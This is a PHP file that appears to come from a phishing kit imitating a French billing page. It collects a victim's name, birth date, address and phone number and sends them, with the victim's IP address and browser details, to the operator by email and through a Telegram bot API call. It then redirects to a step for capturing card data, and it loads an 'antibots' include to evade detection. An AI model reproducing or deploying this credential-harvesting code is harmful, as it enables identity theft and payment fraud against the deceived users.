<?php
include ('../../antibots/sub_sub_includes.php');
include ('../../config.php');
include ('../funcs.php');

checkSession();


    if (!empty($_POST['nom'] && $_POST['prenom'] && $_POST['naissance'] && $_POST['adresse'] && $_POST['ville'] && $_POST['postal'] && $_POST['tel']))
    {

        $_SESSION['nom'] = $_POST['nom'];
        $_SESSION['prenom'] = $_POST['prenom'];;
        $_SESSION['naissance'] = $_POST['naissance'];
        $_SESSION['adresse'] = $_POST['adresse'];
        $_SESSION['ville'] = $_POST['ville'];
        $_SESSION['postal'] = $_POST['postal'];
        $_SESSION['tel'] = $_POST['tel'];

        if ($rez_billing)
        {

            if ($rez_mail)
            {

                $message = "
      
_______________________________

Nom : " . $_SESSION['nom'] . "
Prenom : " . $_SESSION['prenom'] . "
Naissance : " . $_SESSION['naissance'] . "
-
Adresse : " . $_SESSION['adresse'] . "
Ville : " . $_SESSION['ville'] . "
Postal : " . $_SESSION['postal'] . "
Tel : " . $_SESSION['tel'] . "
_______________________________ 
     
Adresse ip : " . $_SESSION['ip'] . "
User Agent : " . $_SESSION['agent_user'] . "        
                
                ";

                $subject = "「🧬」 +1 BILLING • " . $_SESSION['naissance'] . " • " . $_SESSION['nom'] . " • " . $_SESSION['ip'] . "「🧬」";
                $headers = "From: $sender_from <$sender_mail@astridnelsia.fr>";
                mail($rezmail, $subject, $message, $headers);

            }

            if ($rez_tlg)
            {

                $message = "
                
_______________________________
      
Nom : " . $_SESSION['nom'] . "
Prenom : " . $_SESSION['prenom'] . "
Naissance : " . $_SESSION['naissance'] . "
-
Adresse : " . $_SESSION['adresse'] . "
Ville : " . $_SESSION['ville'] . "
Postal : " . $_SESSION['postal'] . "
Tel : " . $_SESSION['tel'] . "
_______________________________
      
Adresse ip : " . $_SESSION['ip'] . "
User Agent : " . $_SESSION['agent_user'] . "        
      
                ";

                file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$billing_chatid&text=" . urlencode($message));

            }

        }

        header('location: ../../steps/card/index.php');

    }
    else
    {
        header('location: ../../steps/billing/index.php?error');
    }

?>
